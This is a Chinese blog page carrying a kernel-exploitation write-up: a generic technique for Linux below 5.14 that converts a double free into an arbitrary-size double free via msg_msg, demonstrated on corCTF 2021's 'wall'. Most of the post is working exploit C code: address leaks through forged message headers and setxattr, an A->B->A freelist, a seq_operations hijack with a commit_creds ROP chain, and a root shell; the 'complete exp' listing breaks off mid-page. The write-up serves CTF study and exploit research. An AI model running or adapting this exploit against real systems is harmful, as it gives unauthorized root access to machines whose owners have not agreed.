<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="我的博客">
<meta property="og:type" content="website">
<meta property="og:title" content="study">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="study">
<meta property="og:description" content="我的博客">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="rootzhang">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>study</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">study</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/20/%E4%BD%8E%E7%89%88%E6%9C%AC-%E4%BD%8E%E4%BA%8E5-14-%E5%9F%BA%E4%BA%8Emsg%E4%B8%8Bdoublefree%E7%9A%84%E5%88%A9%E7%94%A8%E9%80%9A%E8%A7%A3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/11/20/%E4%BD%8E%E7%89%88%E6%9C%AC-%E4%BD%8E%E4%BA%8E5-14-%E5%9F%BA%E4%BA%8Emsg%E4%B8%8Bdoublefree%E7%9A%84%E5%88%A9%E7%94%A8%E9%80%9A%E8%A7%A3/" class="post-title-link" itemprop="url">低版本(低于5.14)基于msg下doublefree的利用通解</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-11-20 17:47:05 / 修改时间：17:48:25" itemprop="dateCreated datePublished" datetime="2022-11-20T17:47:05+08:00">2022-11-20</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>算是自己研究出的msg的利用的新思路吧，不得不说在kernel版本小于5.14时真的是内核利用的利器，我在多个cve中都看到了msg的身影。在msg的利用中，如果可以控制msg_msg的话，可以轻松完成越界读，一般的msg利用也就是越界读泄露数据，除了任意读如果内核在普通用户下能够使用<code>userfault</code>的话还可以利用msg直接任意写，修改进程的cred来完成权限提升，但是在较高版本下是用户是无法使用<code>userfault</code>的，所以没有办法使用msg直接一把梭的，在较高版本下一般是通过msg泄露地址，然后再找相应大小的结构体劫持·程序流。</p>
<p>但是这种方式比较麻烦的一点是第二步劫持程序流，不同的obj大小要找不同的结构体，而且有些大小的obj还找不到可以利用的结构体，我也以为msg的利用也就到这里，但是在周四午睡起来时忽然灵光乍现，msg不是还可以构造任意free吗，那完全可以利用msg构造出任意size的obj的doublefree啊，就把问题从特定不好利用的size的obj转化成了容易利用的size的obj了，就完全实现了思路上的通解了。</p>
<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ul>
<li>可以对0x40~0x1000以内的obj kfree两次(或者释放一次但是拥有写功能)</li>
<li>内核版本小于5.14，因为如果超过了5.14，msg就不从kmalloc-xxx中拿obj了，而是从kmalloc-cg-xxx中拿obj了，如果可以doublefree的obj是通过<code>GFP_KERNEL</code>kmalloc到的，那msg就完全申请不到这个obj了。</li>
<li>开启了<code>MSG_COPY</code>功能</li>
</ul>
<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>就以corctf2021的wall作为例子（本来相用n1的praymoon做例子的，结果调试了一下午才发现版本太高了msg没法用了。），简而言之可以把wall看做只能释放两次同一个0x40大小的obj的抽象模型。</p>
<h3 id="一-泄露地址"><a href="#一-泄露地址" class="headerlink" title="一.泄露地址"></a>一.泄露地址</h3><p>首先是利用ko申请一个0x40的obj然后把他释放掉</p>
<p>在这个例子中我打算利用msg构造出doublefree的0x20的obj,这样就可以使用<code>seq_operations</code>劫持程序流来提升权限，那就得根据0x20精心构造msg了，我的构造如下</p>
<p>使用了两个消息队列，分别是msg_id[0]和msg_id[1],这个msg_id[0]的msg是刚刚我们释放的obj，然后再使用ko把这个obj再释放一次，由于使用的是slab分配算法，所以释放后obj的内容并不会发生改变，然后再使用<code>setxattr</code>把这个obj申请回来修改其中的<code>m_ts</code>字段，然后再使用msg_id[0]读这个msg,就能越界读到msg_id[1]的第一个msg了，主要记录的就是msg_id[1]的第二个msg的起始地址<code>ll_next</code>和msg_id[1]的msg_queue<code>ll_prev</code>，然后还有几率读到<code>error_injection_list</code>，利用这个泄露内核地址。然后再通过msg_id[1]的第二个msg的<code>next</code>字段读到一个0x20的obj的地址，即target_obj。</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20221120171926473.png" alt="image-20221120171926473"></p>
<p>代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">add_rule(fd,<span class="number">0</span>,INBOUND);</span><br><span class="line">    dup_rule(fd,<span class="number">0</span>,INBOUND);</span><br><span class="line">    del_rule(fd,<span class="number">0</span>,INBOUND);</span><br><span class="line">    msg-&gt;mtype=<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">memset</span>(msg-&gt;mtext,<span class="number">0x61</span>,<span class="number">0x1000</span>);</span><br><span class="line">    send_msg(msg_id[<span class="number">0</span>],msg,<span class="number">0x10</span>,IPC_NOWAIT);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(msg-&gt;mtext,<span class="number">0x62</span>,<span class="number">0x1000</span>);</span><br><span class="line">    send_msg(msg_id[<span class="number">1</span>],msg,<span class="number">0x10</span>,IPC_NOWAIT);</span><br><span class="line"></span><br><span class="line">    msg-&gt;mtype=<span class="number">2</span>;</span><br><span class="line">    <span class="built_in">memset</span>(msg-&gt;mtext,<span class="number">0x63</span>,<span class="number">0x1000</span>);</span><br><span class="line">    send_msg(msg_id[<span class="number">1</span>],msg,<span class="number">0xfe8</span>,IPC_NOWAIT);</span><br><span class="line"></span><br><span class="line">    msg-&gt;mtype=<span class="number">3</span>;</span><br><span class="line">    <span class="built_in">memset</span>(msg-&gt;mtext,<span class="number">0x64</span>,<span class="number">0x1000</span>);</span><br><span class="line">    send_msg(msg_id[<span class="number">1</span>],msg,<span class="number">0xfe8</span>,IPC_NOWAIT);</span><br><span class="line"></span><br><span class="line">    msg-&gt;mtype=<span class="number">4</span>;</span><br><span class="line">    <span class="built_in">memset</span>(msg-&gt;mtext,<span class="number">0x65</span>,<span class="number">0x1000</span>);</span><br><span class="line">    send_msg(msg_id[<span class="number">1</span>],msg,<span class="number">0x1008</span>,IPC_NOWAIT);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] doublefree\n&quot;</span>);</span><br><span class="line">    del_rule(fd,<span class="number">0</span>,OUTBOUND);</span><br><span class="line">    msg_header *fake_msg_header=(msg_header *)<span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">    fake_msg_header-&gt;ll_next=(<span class="keyword">void</span> *)<span class="number">0x4141414141414141</span>;</span><br><span class="line">    fake_msg_header-&gt;ll_prev=(<span class="keyword">void</span> *)<span class="number">0x4242424242424242</span>;</span><br><span class="line">    fake_msg_header-&gt;m_type=<span class="number">1</span>;</span><br><span class="line">    fake_msg_header-&gt;m_ts=<span class="number">0x1000</span><span class="number">-0x30</span>;</span><br><span class="line"></span><br><span class="line">    setxattr(<span class="string">&quot;/exp&quot;</span>, <span class="string">&quot;msg&quot;</span>, fake_msg_header, <span class="number">0x40</span>, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    get_msg(msg_id[<span class="number">0</span>],re_buf,<span class="number">0x1000</span><span class="number">-0x30</span>,<span class="number">0</span>, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x2000</span>/<span class="number">0x8</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>((!<span class="built_in">strncmp</span>(&amp;re_buf[i],<span class="string">&quot;bbbbbbbbbbbbbbbb&quot;</span>,<span class="number">0x10</span>))&amp;&amp;(!<span class="built_in">queue</span>))&#123;</span><br><span class="line">            <span class="built_in">queue</span>=re_buf[i<span class="number">-5</span>];</span><br><span class="line">            page_msg=re_buf[i<span class="number">-6</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(((re_buf[i]&amp;<span class="number">0xffff</span>)==<span class="number">0x1520</span>)&amp;&amp;(!kernelbase))&#123; <span class="comment">//error_injection_list</span></span><br><span class="line">            kernelbase=re_buf[i]<span class="number">-0xc41520</span>;</span><br><span class="line">            init_task=kernelbase+<span class="number">0xc124c0</span>;</span><br><span class="line">            init_cred=kernelbase+<span class="number">0xc33060</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">queue</span>&amp;&amp;kernelbase)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m msg_queue_addr:%p \e[0m\n&quot;</span>,<span class="built_in">queue</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m page_msg_addr:%p \e[0m\n&quot;</span>,page_msg);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m kernelbase_addr:%p \e[0m\n&quot;</span>,kernelbase);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m init_task_addr:%p \e[0m\n&quot;</span>,init_task);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m init_cred_addr:%p \e[0m\n&quot;</span>,init_cred);</span><br><span class="line">    <span class="keyword">if</span>((!<span class="built_in">queue</span>)||(!kernelbase))&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;get queue fail or kernelbase fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fake_msg_header-&gt;m_type=<span class="number">1</span>;</span><br><span class="line">    fake_msg_header-&gt;m_ts=<span class="number">0x1050</span>;</span><br><span class="line">    fake_msg_header-&gt;next=page_msg<span class="number">-0x10</span>;</span><br><span class="line">    setxattr(<span class="string">&quot;/exp&quot;</span>, <span class="string">&quot;msg&quot;</span>, fake_msg_header, <span class="number">0x40</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(re_buf,<span class="number">0</span>,<span class="number">0x2000</span>);</span><br><span class="line">    get_msg(msg_id[<span class="number">0</span>],re_buf,<span class="number">0x1050</span>,<span class="number">0</span>, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x2000</span>/<span class="number">0x8</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(&amp;re_buf[i],<span class="string">&quot;cccccccccccccccc&quot;</span>,<span class="number">0x10</span>))&#123;</span><br><span class="line">            target_obj=re_buf[i<span class="number">-2</span>];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m target_obj_addr:%p \e[0m\n&quot;</span>,target_obj);</span><br></pre></td></tr></table></figure>

<h3 id="二-任意free"><a href="#二-任意free" class="headerlink" title="二.任意free"></a>二.任意free</h3><p>到这里我们已经知道了<code>target_obj</code>的地址了，这个obj的大小是0x20的，当我们使用msgrcv()的时候，如果不使用<code>MSG_COPY</code>的话，查找到的<code>msg</code>是会被脱链然后free掉的，所以如果把msg_id[0]的next填上target_obj的地址，那msgrcv<code>msg_id[0]</code>的时候就把target_obj给释放掉了，但是其实target_obj还在msg_id[1]的第二个msg的段上，所以还可以被free一次，这就可以构造出doublefree了。构造如下。</p>
<p>注意内核是会检查doublefree的，但是检查不是很严格，就和glibc的fastbin一样，所以构造出A-&gt;B-&gt;A就好了。剩下两个msg就是为了构造<code>A-&gt;B-&gt;A</code>的。</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20221120173429967.png" alt="image-20221120173429967"></p>
<p>代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">fake_msg_header-&gt;ll_next=<span class="built_in">queue</span>;</span><br><span class="line">    fake_msg_header-&gt;ll_prev=<span class="built_in">queue</span>;</span><br><span class="line">    fake_msg_header-&gt;m_type=<span class="number">1</span>;</span><br><span class="line">    fake_msg_header-&gt;m_ts=<span class="number">0x10</span>;</span><br><span class="line">    fake_msg_header-&gt;next=target_obj;</span><br><span class="line">    fake_msg_header-&gt;security=<span class="number">0</span>;</span><br><span class="line">    setxattr(<span class="string">&quot;/exp&quot;</span>, <span class="string">&quot;msg&quot;</span>, fake_msg_header, <span class="number">0x40</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(re_buf,<span class="number">0</span>,<span class="number">0x2000</span>);</span><br><span class="line">    get_msg(msg_id[<span class="number">1</span>],re_buf,<span class="number">0xfe8</span>,<span class="number">2</span>,IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(re_buf,<span class="number">0</span>,<span class="number">0x2000</span>);</span><br><span class="line">    get_msg(msg_id[<span class="number">1</span>],re_buf,<span class="number">0x1008</span>,<span class="number">4</span>,IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(re_buf,<span class="number">0</span>,<span class="number">0x2000</span>);</span><br><span class="line">    get_msg(msg_id[<span class="number">1</span>],re_buf,<span class="number">0xfe8</span>,<span class="number">3</span>,IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line"></span><br><span class="line">    get_msg(msg_id[<span class="number">0</span>],re_buf,<span class="number">0xfe8</span>,<span class="number">1</span>,IPC_NOWAIT | MSG_NOERROR);</span><br></pre></td></tr></table></figure>



<h3 id="三-劫持程序流"><a href="#三-劫持程序流" class="headerlink" title="三.劫持程序流"></a>三.劫持程序流</h3><p>现在0x20的slab的freelist上就有这样的链子<code>A-&gt;B-&gt;A</code>,这样就好办了，先申请一次<code>seq_operation</code>然后第三次申请又能申请这个seq_operation的obj了，就能修改函数指针劫持程序流了。</p>
<p>代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">seq_fd=open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(seq_fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open seq fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> tmp=open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(tmp&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open seq fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">size_t</span> seq_operation[<span class="number">4</span>]=&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    add_rsp_0x108_pop_3=add_rsp_0x108_pop_3-vmlinux_nokaslr_addr+kernelbase;</span><br><span class="line">    pop_rdi_ret=pop_rdi_ret-vmlinux_nokaslr_addr+kernelbase;</span><br><span class="line">    commit_cred=commit_cred-vmlinux_nokaslr_addr+kernelbase;</span><br><span class="line">    kpti_addr=kpti_addr-vmlinux_nokaslr_addr+kernelbase;</span><br><span class="line">    ret=ret-vmlinux_nokaslr_addr+kernelbase;</span><br><span class="line"></span><br><span class="line">    seq_operation[<span class="number">0</span>]=<span class="number">0xffffffff81019d8b</span>;</span><br><span class="line"></span><br><span class="line">    setxattr(<span class="string">&quot;/exp&quot;</span>, <span class="string">&quot;seq&quot;</span>, seq_operation, <span class="number">0x20</span>, <span class="number">0</span>);</span><br><span class="line">    __asm__(</span><br><span class="line">            <span class="string">&quot;mov r15, pop_rdi_ret;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r14, init_cred;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r13, commit_cred;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r12, ret;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rbp, ret;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rbx, pop_rdi_ret;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r11, ret;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r10, ret;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r9,  kpti_addr;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r8,  0xbeefdead;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rax, 0;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rdi, seq_fd;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rsi, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rdx, 0x200;&quot;</span></span><br><span class="line">            <span class="string">&quot;syscall;&quot;</span></span><br><span class="line">        );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;uid:%d\n&quot;</span>,getuid());</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span 